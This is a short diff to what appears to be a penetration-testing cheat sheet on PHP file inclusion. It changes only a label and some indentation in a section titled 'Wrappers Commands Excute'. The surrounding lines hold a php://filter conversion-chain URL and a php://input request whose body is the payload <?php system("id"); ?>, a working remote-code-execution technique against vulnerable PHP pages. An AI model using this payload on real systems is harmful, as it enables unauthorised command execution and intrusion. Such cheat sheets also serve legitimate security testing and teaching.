@@ -154,13 +154,13 @@ http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resour
 ```
 > Wrappers Commands Excute :
 
-+ Simple input for excute commands
++ Simple input for excute commands, using burpsuite
 
 ```
 http://example.com/index.php?page=php://input
   ... Host: localhost:8081
   ... Content-Length: 25
-  ...
+    ...
 <?php system("id"); ?>
 ```
 
